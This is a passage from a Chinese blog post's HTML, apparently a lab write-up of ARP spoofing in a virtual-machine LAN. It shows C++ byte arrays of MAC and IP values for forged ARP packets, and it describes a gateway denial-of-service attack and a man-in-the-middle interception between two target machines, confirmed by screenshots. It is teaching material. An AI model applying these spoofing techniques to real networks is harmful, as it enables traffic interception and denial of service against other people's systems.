<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20210924165021060.png" alt="image-20210924165021060"  />
</li>
<li>对此ICMP 包，进行分析，可以看到发包的mac地址确实为 广播地址 <code>FF-FF-FF-FF-FF-FF</code></li>
</ul>
</li>
</ul>
<h4 id="拒绝服务攻击-1">拒绝服务攻击<a hidden class="anchor" aria-hidden="true" href="#拒绝服务攻击-1">#</a></h4>
<ul>
<li>
<p>构造虚假响应包，其中协议地址为关键服务的IP地址，例如网关，而MAC地址为不存在的虚假地址，将这样的响应包发给局域网内主机。那么，局域网主机发给关键服务（如网关）的数据包都将丢失，从而形成拒绝服务攻击。</p>
</li>
<li>
<p>构造ARP数据包</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#f00">将</span>arp包 <span style="color:#f00">发送源</span>mac修改为虚假 <span style="color:#f00">的</span> mac地址
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span> mac[<span style="color:#ff0;font-weight:bold">6</span>] = { <span style="color:#ff0;font-weight:bold">0x01</span>,<span style="color:#ff0;font-weight:bold">0x01</span>,<span style="color:#ff0;font-weight:bold">0x01</span>,<span style="color:#ff0;font-weight:bold">0x01</span>,<span style="color:#ff0;font-weight:bold">0x01</span>,<span style="color:#ff0;font-weight:bold">0x01</span> };
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span> ip[<span style="color:#ff0;font-weight:bold">4</span>] = { <span style="color:#ff0;font-weight:bold">192</span>,<span style="color:#ff0;font-weight:bold">168</span>,<span style="color:#ff0;font-weight:bold">195</span>,<span style="color:#ff0;font-weight:bold">2</span> };
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span> dmac[<span style="color:#ff0;font-weight:bold">6</span>] = {<span style="color:#ff0;font-weight:bold">0x00</span>,<span style="color:#ff0;font-weight:bold">0x0C</span>,<span style="color:#ff0;font-weight:bold">0x29</span>,<span style="color:#ff0;font-weight:bold">0x19</span>,<span style="color:#ff0;font-weight:bold">0xba</span>,<span style="color:#ff0;font-weight:bold">0x6e</span>};
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span> d_ip[<span style="color:#ff0;font-weight:bold">4</span>] = {<span style="color:#ff0;font-weight:bold">192</span>,<span style="color:#ff0;font-weight:bold">168</span>,<span style="color:#ff0;font-weight:bold">195</span>,<span style="color:#ff0;font-weight:bold">138</span>};
</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>在 发送arp数据包前</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20210924170322268.png" alt="image-20210924170322268"  />
</li>
<li>可以看到 arp 表 对应的mac 地址 正确，并且网页可以正常打开。</li>
</ul>
</li>
<li>
<p>发送 arp 包</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20210924170459252.png" alt="image-20210924170459252"  />
</li>
<li>查看靶机的 arp 表 和 上网状态。</li>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20210924170726781.png" alt="image-20210924170726781"  />
</li>
<li>可以看到 网关的 mac 地址 被篡改为 <code>01-01-01-01-01-01</code> ，同时也无法访问百度了。</li>
</ul>
</li>
</ul>
<h4 id="中间人攻击-2">中间人攻击<a hidden class="anchor" aria-hidden="true" href="#中间人攻击-2">#</a></h4>
<ul>
<li>
<p>这里设计思路与利用WinArpAttacker 进行中间人攻击一样。</p>
</li>
<li>
<p>将靶机winxp(<code>IP 192.168.195.138</code>) 和 主机 win10 (<code>IP 192.168.195.1</code>) 之间的mac均篡改为 攻击机 (<code>IP 192.168.195.131</code>)的mac地址。</p>
</li>
<li>
<p>这里需要构造两个arp请求包</p>
<ul>
<li>
<p>对于靶机 win xp</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span> mac[<span style="color:#ff0;font-weight:bold">6</span>] = { <span style="color:#ff0;font-weight:bold">0x00</span>,<span style="color:#ff0;font-weight:bold">0x0c</span>,<span style="color:#ff0;font-weight:bold">0x29</span>,<span style="color:#ff0;font-weight:bold">0x06</span>,<span style="color:#ff0;font-weight:bold">0x65</span>,<span style="color:#ff0;font-weight:bold">0xc9</span> };
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span> ip[<span style="color:#ff0;font-weight:bold">4</span>] = { <span style="color:#ff0;font-weight:bold">192</span>,<span style="color:#ff0;font-weight:bold">168</span>,<span style="color:#ff0;font-weight:bold">195</span>,<span style="color:#ff0;font-weight:bold">1</span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span> dmac[<span style="color:#ff0;font-weight:bold">6</span>] = {<span style="color:#ff0;font-weight:bold">0x00</span>,<span style="color:#ff0;font-weight:bold">0x0C</span>,<span style="color:#ff0;font-weight:bold">0x29</span>,<span style="color:#ff0;font-weight:bold">0x19</span>,<span style="color:#ff0;font-weight:bold">0xba</span>,<span style="color:#ff0;font-weight:bold">0x6e</span>};
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span> d_ip[<span style="color:#ff0;font-weight:bold">4</span>] = {<span style="color:#ff0;font-weight:bold">192</span>,<span style="color:#ff0;font-weight:bold">168</span>,<span style="color:#ff0;font-weight:bold">195</span>,<span style="color:#ff0;font-weight:bold">138</span>};
</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>对于靶机 win 10</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span> mac[<span style="color:#ff0;font-weight:bold">6</span>] = { <span style="color:#ff0;font-weight:bold">0x00</span>,<span style="color:#ff0;font-weight:bold">0x0c</span>,<span style="color:#ff0;font-weight:bold">0x29</span>,<span style="color:#ff0;font-weight:bold">0x06</span>,<span style="color:#ff0;font-weight:bold">0x65</span>,<span style="color:#ff0;font-weight:bold">0xc9</span> };
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span> ip[<span style="color:#ff0;font-weight:bold">4</span>] = { <span style="color:#ff0;font-weight:bold">192</span>,<span style="color:#ff0;font-weight:bold">168</span>,<span style="color:#ff0;font-weight:bold">195</span>,<span style="color:#ff0;font-weight:bold">1</span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span> mac[<span style="color:#ff0;font-weight:bold">6</span>] = { <span style="color:#ff0;font-weight:bold">0x00</span>,<span style="color:#ff0;font-weight:bold">0x50</span>,<span style="color:#ff0;font-weight:bold">0x56</span>,<span style="color:#ff0;font-weight:bold">0xc0</span>,<span style="color:#ff0;font-weight:bold">0x00</span>,<span style="color:#ff0;font-weight:bold">0x08</span> };
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span> d_ip[<span style="color:#ff0;font-weight:bold">4</span>] = {<span style="color:#ff0;font-weight:bold">192</span>,<span style="color:#ff0;font-weight:bold">168</span>,<span style="color:#ff0;font-weight:bold">195</span>,<span style="color:#ff0;font-weight:bold">1</span>};
</span></span></code></pre></td></tr></table>
</div>
</div></li>
</ul>
</li>
<li>
<p>查看未构造包前的状态</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20210924171825392.png" alt="image-20210924171825392"  />
</li>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20210924171859392.png" alt="image-20210924171859392"  />
</li>
<li>此时两个靶机之间对应的mac 均为正确的。</li>
</ul>
</li>
<li>
<p>发送两个arp 请求包。</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20210924172318768.png" alt="image-20210924172318768"  />
</li>
<li>发送完成</li>
</ul>
</li>
<li>
<p>查看发送后的 mac 对应表</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20210924173037661.png" alt="image-20210924173037661"  />
</li>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20210924173111228.png" alt="image-20210924173111228"  />
</li>
<li>可以很直观的看到，两个靶机之间的mac地址均被篡改为 攻击机的 ip地址。</li>
</ul>
</li>
<li>
<p>这里用win10 ping 通 靶机 win xp,同时在攻击机用 wireshark进行抓包。</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20210924173443289.png" alt="image-20210924173443289"  />
</li>
<li>可以看到信息被攻击机截获，并且mac地址被篡改为  攻击机的 mac地址 ，
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/image-20210924173651760.png" alt="image-20210924173651760"  />
</li>
</ul>
</li>
<li>攻击机只需要将mac地址修改一下即可实现中间人攻击。</li>
</ul>
</li>
</ul>
<h3 id="0x05-结论">0x05 结论<a hidden class="anchor" aria-hidden="true" href="#0x05-结论">#</a></h3>
<ul>
<li>ARP实验过程中，发送的数据包过少，计算机系统自身会迅速发出arp广播包 来恢复正确的mac地址，实验过程迅速的完成。长期的攻击需要不间断的发送arp请求包。</li>
<li>arp欺骗攻击的原理通过抓包来理解的透彻。</li>
<li>vm虚拟机利用nat桥接模式可以实现，主机和虚拟机在同一局域网下，使用vm8的虚拟网卡，以此作为实验的基础。</li>
</ul>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="http://www.reus09.top/tags/arp%E6%AC%BA%E9%AA%97/">arp欺骗</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="http://www.reus09.top/posts/life/2021%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/">
    <span class="title">« Prev</span>
    <br>
    <span>2021年度总结</span>
  </a>
  <a class="next" href="http://www.reus09.top/posts/tech/rop/">
    <span class="title">Next »</span>
    <br>
    <span>Rop</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2022 <a href="http://www.reus09.top">Reus09&#39;s Blog</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
